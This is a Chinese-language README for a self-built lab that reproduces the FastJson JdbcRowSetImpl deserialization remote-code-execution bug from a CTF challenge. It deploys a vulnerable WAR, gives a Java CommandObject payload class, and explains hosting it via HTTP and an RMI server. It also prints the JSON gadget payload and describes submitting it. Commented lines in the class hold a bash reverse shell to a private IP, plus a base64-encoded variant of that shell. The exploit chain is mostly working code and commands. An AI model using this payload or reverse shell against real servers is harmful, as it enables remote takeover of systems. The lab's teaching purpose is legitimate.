# FastJson-JdbcRowSetImpl

## 初心

### 在前不久的护网杯CTF比赛中，有一道Web的“easy_web”题，其实就是利用FastJson的JdbcRowSetImpl类反序列化漏洞进行Shell，然后cat Flag。一大部分人对这道题是懵逼的，没做出来，后面因护网杯题目关闭了，没有此漏洞的学习环境，所以我就写了此环境，方便大家学习交流。

## 漏洞环境构建

```
root@Bearcat:/# wget "https://github.com/iBearcat/FastJson-JdbcRowSetImpl/raw/master/FastJson_Vul.war" -P /opt/apache-tomcat-8.5.24/webapps/ && cd /opt/apache-tomcat-8.5.24/bin/ && ./startup.sh
--2018-10-19 03:56:31--  https://github.com/iBearcat/FastJson-JdbcRowSetImpl/raw/master/FastJson_Vul.war
Resolving github.com (github.com)... 192.30.253.112, 192.30.253.113
Connecting to github.com (github.com)|192.30.253.112|:443... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://github.com/iBearcat/FastJson-JdbcRowSetImpl-RCE/raw/master/FastJson_Vul.war [following]
--2018-10-19 03:56:34--  https://github.com/iBearcat/FastJson-JdbcRowSetImpl-RCE/raw/master/FastJson_Vul.war
Reusing existing connection to github.com:443.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/iBearcat/FastJson-JdbcRowSetImpl-RCE/master/FastJson_Vul.war [following]
--2018-10-19 03:56:36--  https://raw.githubusercontent.com/iBearcat/FastJson-JdbcRowSetImpl-RCE/master/FastJson_Vul.war
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.24.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.24.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1124826 (1.1M) [application/octet-stream]
Saving to: ‘/opt/apache-tomcat-8.5.24/webapps/FastJson_Vul.war’

FastJson_Vul.war                          100%[==================================================================================>]   1.07M   116KB/s    in 9.2s

2018-10-19 03:56:46 (119 KB/s) - ‘/opt/apache-tomcat-8.5.24/webapps/FastJson_Vul.war’ saved [1124826/1124826]

Using CATALINA_BASE:   /opt/apache-tomcat-8.5.24
Using CATALINA_HOME:   /opt/apache-tomcat-8.5.24
Using CATALINA_TMPDIR: /opt/apache-tomcat-8.5.24/temp
Using JRE_HOME:        //opt/jdk1.8.0_131/jre
Using CLASSPATH:       /opt/apache-tomcat-8.5.24/bin/bootstrap.jar:/opt/apache-tomcat-8.5.24/bin/tomcat-juli.jar
Tomcat started.
root@Bearcat:/opt/apache-tomcat-8.5.24/bin#
```

![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/1.jpg?raw=true)

### 访问漏洞环境 http://localhost:8888/FastJson_Vul

![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/2.jpg?raw=true)

## 漏洞利用

### 在CommandObject.java类中的commands数组中构造想要执行的命令

### 编译 javac CommandObject.java

```
import	java.lang.Runtime;
import	java.lang.Process;
public class CommandObject {
    public CommandObject(){
        try{
			Runtime	rt	=	Runtime.getRuntime();
			//Runtime.getRuntime().exec("/bin/bash -i >&/dev/tcp/192.168.43.14/2018<&1");
			//String[] commands = {"bash -c {echo,L2Jpbi9iYXNoIC1pID4mL2Rldi90Y3AvMTkyLjE2OC40My4xNC8yMDE4PCYx}|{base64,-d}|{bash,-i}"};
			
			String[] commands = {"touch","/opt/test"}; //Command
			Process	pc = rt.exec(commands);
			pc.waitFor();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        CommandObject e = new CommandObject();
    }
}
```

![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/3.jpg?raw=true)

## 漏洞利用

### 开启一个HTTP服务，并且开启 RMIServer

### 如：

```
Python2 -m SimpleHTTPServer 80
Python3 -m http.server 80
```

### 生成Payload

```
java -jar FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar <HTTP服务地址> 指定RMI端口
```

### FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar 会生成一串Json Payload

![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/4.jpg?raw=true)

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://192.168.43.14:6666/Object","autoCommit":true}
```

### 把它Copy到漏洞环境的input中，然后submit进行攻击。

![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/5.jpg?raw=true)


### 成功执行命令，并touch test

```
String[] commands = {"touch","/opt/test"}; //Command
```
![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/6.jpg?raw=true)

# 致谢我的好基友

### pyn3rd https://github.com/pyn3rd/CVE-2018-2893
### 背影   https://github.com/yanweijin
